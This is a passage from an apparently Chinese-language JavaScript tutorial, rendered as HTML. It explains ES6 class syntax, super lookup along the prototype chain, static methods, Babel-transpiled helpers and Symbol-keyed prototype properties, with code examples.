class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 近似等价于</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>&#125;<br><br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;<br></code></pre></td></tr></table></figure><p><strong>本质特性</strong></p><ul><li>原型继承的语法糖：没有引入新继承模型</li><li>更严格的语法：强制使用 new，默认严格模式</li><li>更清晰的封装：明确区分构造函数、方法和静态成员</li><li>更好的可读性：类似传统OOP语言的语法结构</li><li>不可枚举的方法：避免 for-in 循环污染</li></ul><h2 id="9-2-super-关键字的原型链逻辑"><a href="#9-2-super-关键字的原型链逻辑" class="headerlink" title="9.2 super 关键字的原型链逻辑"></a>9.2 <code>super</code> 关键字的原型链逻辑</h2><p>super 是 ES6 class 中用于访问父类内容的关键字</p><p><strong>两种调用方式</strong></p><p>（1）作为函数调用（仅在构造函数中）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// 调用父类构造函数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原型链逻辑如下：</p><ol><li>创建 Child 实例时，先调用 super() 相当于 Parent.call(this)</li><li>确保 this 先被父类初始化</li><li>建立正确的原型链关系：<code>ChildInstance.__proto__</code> → <code>Child.prototype.__proto__</code> → <code>Parent.prototype</code></li></ol><p>（2）作为对象引用（在方法中）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello from Parent&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHello</span>() + <span class="hljs-string">&#x27; and Child&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原型链逻辑如下：</p><ol><li>super 指向父类原型：super &#x3D; Object.getPrototypeOf(Child.prototype)</li><li>方法调用时 this 仍指向当前实例</li><li>相当于 Parent.prototype.sayHello.call(this)</li></ol><p><strong>原型链查找机制</strong></p><p>（1）方法中的 super 查找路径</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">A</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">method</span>(); &#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">B</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">method</span>(); &#125; &#125;<br><br><span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title function_">C</span>();<br>c.<span class="hljs-title function_">method</span>();<br></code></pre></td></tr></table></figure><p>其查找过程如下：</p><ol><li>C.prototype.method 中的 super → B.prototype</li><li>B.prototype.method 中的 super → A.prototype</li><li>最终调用 A.prototype.method</li></ol><p>（2）静态方法中的 super</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Parent static&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">staticMethod</span>() + <span class="hljs-string">&#x27; + Child static&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其查找逻辑：</p><ol><li>super 指向父类本身：super &#x3D; Object.getPrototypeOf(Child)</li><li>相当于 Parent.staticMethod.call(this)</li></ol><p><strong>底层实现原理</strong></p><p>（1）Babel 转译后的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">parentMethod</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 转译为</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Child</span> = (<span class="hljs-keyword">function</span>(<span class="hljs-params">_Parent</span>) &#123;<br>  <span class="hljs-title function_">_inherits</span>(<span class="hljs-title class_">Child</span>, _Parent);<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">Child</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_possibleConstructorReturn</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-title class_">Child</span>).<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>));<br>  &#125;<br><br>  <span class="hljs-title function_">_createClass</span>(<span class="hljs-title class_">Child</span>, [&#123;<br>    <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;method&quot;</span>,<br>    <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">_get</span>(<span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>), <span class="hljs-string">&quot;parentMethod&quot;</span>, <span class="hljs-variable language_">this</span>).<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>    &#125;<br>  &#125;]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Child</span>;<br>&#125;)(<span class="hljs-title class_">Parent</span>);<br></code></pre></td></tr></table></figure><p>（2）关键帮助函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-params">o</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(o);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_get</span>(<span class="hljs-params">target, property, receiver</span>) &#123;<br>  <span class="hljs-comment">// 模拟 super 属性查找</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Reflect</span> !== <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title class_">Reflect</span>.<span class="hljs-property">get</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property, receiver || <span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> base = <span class="hljs-title function_">_getPrototypeOf</span>(target);<br>  <span class="hljs-keyword">if</span> (!base) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">var</span> desc = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(base, property);<br>  <span class="hljs-keyword">if</span> (desc.<span class="hljs-property">get</span>) &#123;<br>    <span class="hljs-keyword">return</span> desc.<span class="hljs-property">get</span>.<span class="hljs-title function_">call</span>(receiver || <span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> base[property];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-3-静态方法与原型的关系"><a href="#9-3-静态方法与原型的关系" class="headerlink" title="9.3 静态方法与原型的关系"></a>9.3 静态方法与原型的关系</h2><p>静态方法是 JavaScript 类中直接绑定到构造函数本身而非原型上的方法</p><p><strong>核心概念对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">静态方法</th><th align="left">原型方法</th></tr></thead><tbody><tr><td align="left">存储位置</td><td align="left">构造函数本身</td><td align="left">构造函数的 prototype 对象</td></tr><tr><td align="left">调用方式</td><td align="left">通过类名调用（ClassName.method()）</td><td align="left">通过实例调用（instance.method()）</td></tr><tr><td align="left">this 指向</td><td align="left">类构造函数</td><td align="left">实例对象</td></tr><tr><td align="left">继承行为</td><td align="left">可被子类继承</td><td align="left">实例可访问</td></tr><tr><td align="left">使用场景</td><td align="left">工具方法&#x2F;工厂方法</td><td align="left">实例相关操作</td></tr></tbody></table><p><strong>内存结构与原型链分析</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Static&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">prototypeMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Prototype&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 内存结构等价于：</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyClass</span>(<span class="hljs-params"></span>) &#123;&#125;<br><br><span class="hljs-comment">// 静态方法（直接挂载构造函数）</span><br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property">staticMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Static&#x27;</span>);<br>&#125;;<br><br><span class="hljs-comment">// 原型方法</span><br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">prototypeMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Prototype&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>底层实现（Babel 转译）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 静态方法继承的实现</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_inherits</span>(<span class="hljs-params">subClass, superClass</span>) &#123;<br>  <span class="hljs-comment">// 设置原型继承</span><br>  subClass.<span class="hljs-property">__proto__</span> = superClass;<br>  <br>  <span class="hljs-comment">// 复制静态方法</span><br>  <span class="hljs-keyword">if</span> (superClass) &#123;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-property">setPrototypeOf</span> <br>      ? <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(subClass, superClass)<br>      : subClass.<span class="hljs-property">__proto__</span> = superClass;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-4-符号属性（Symbol）对原型的影响"><a href="#9-4-符号属性（Symbol）对原型的影响" class="headerlink" title="9.4 符号属性（Symbol）对原型的影响"></a>9.4 符号属性（Symbol）对原型的影响</h2><p><strong>Symbol 在原型系统中的行为</strong></p><p>（1）原型上的 Symbol 属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> customMethod = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;custom&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  [customMethod]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Symbol method called&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>instance[customMethod](); <span class="hljs-comment">// &quot;Symbol method called&quot;</span><br><br><span class="hljs-comment">// 检查原型链</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(customMethod <span class="hljs-keyword">in</span> <span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance.<span class="hljs-title function_">hasOwnProperty</span>(customMethod)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>（2）内置 Symbol 与原型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomIterable</span> &#123;<br>  *[<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]() &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span>;<br>  &#125;<br>&#125;<br><br>[...<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomIterable</span>()]; <span class="hljs-comment">// [1, 2, 3]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol 对原型系统的特殊影响</strong></p><p>（1）避免属性名冲突</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不同库安全扩展原型</span><br><span class="hljs-keyword">const</span> lib1Method = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;lib1&#x27;</span>);<br><span class="hljs-keyword">const</span> lib2Method = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;lib2&#x27;</span>);<br><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[lib1Method] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Lib1实现 */</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[lib2Method] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Lib2实现 */</span> &#125;;<br><br><span class="hljs-comment">// 互不干扰</span><br>[][lib1Method]();<br>[][lib2Method]();<br></code></pre></td></tr></table></figure><p>（2）隐藏原型方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> internalLogic = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;internal&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureAPI</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">publicData</span> = <span class="hljs-string">&#x27;safe&#x27;</span>;<br>  &#125;<br>  <br>  [internalLogic]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;内部处理逻辑&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">publicMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>[internalLogic]();<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">publicData</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> api = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureAPI</span>();<br>api.<span class="hljs-title function_">publicMethod</span>(); <span class="hljs-comment">// 正常工作</span><br>api[internalLogic](); <span class="hljs-comment">// 报错：除非能获取Symbol引用</span><br></code></pre></td></tr></table></figure><p>（3）不可枚举性对原型遍历的影响</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;test&#x27;</span>)] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-comment">// 不影响常规遍历</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 无输出（无枚举属性）</span><br>&#125;<br><br><span class="hljs-comment">// 也不影响Object.keys</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)); <span class="hljs-comment">// 不包含Symbol属性</span><br></code></pre></td></tr></table></figure><p><strong>内置 Symbol 与原型行为定制</strong></p><p>（1）Symbol.hasInstance</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpecialArray</span> &#123;<br>  <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](instance) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(instance);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MySpecialArray</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）Symbol.species</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-keyword">static</span> get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>; <span class="hljs-comment">// 控制衍生对象的构造函数</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> myArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyArray</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">const</span> mapped = myArr.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x*<span class="hljs-number">2</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyArray</span>); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（3）Symbol.toStringTag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCollection</span> &#123;<br>  get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;MyCollection&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCollection</span>().<span class="hljs-title function_">toString</span>()); <br><span class="hljs-comment">// &quot;[object MyCollection]&quot;</span><br></code></pre></td></tr></table></figure><p><strong>Symbol 属性的继承</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parentSymbol = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;parent&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  [parentSymbol]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Parent symbol method&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;&#125;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>();<br>child[parentSymbol](); <span class="hljs-comment">// &quot;Parent symbol method&quot;</span><br><br><span class="hljs-comment">// 检查继承关系</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>).<span class="hljs-title function_">includes</span>(parentSymbol)<br>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>).<span class="hljs-title function_">includes</span>(parentSymbol)<br>); <span class="hljs-comment">// false（继承而非自有）</span><br></code></pre></td></tr></table></figure><h1 id="第十章：实战与面试题解析"><a href="#第十章：实战与面试题解析" class="headerlink" title="第十章：实战与面试题解析"></a>第十章：实战与面试题解析</h1><h2 id="10-1-手写-new-操作符实现"><a 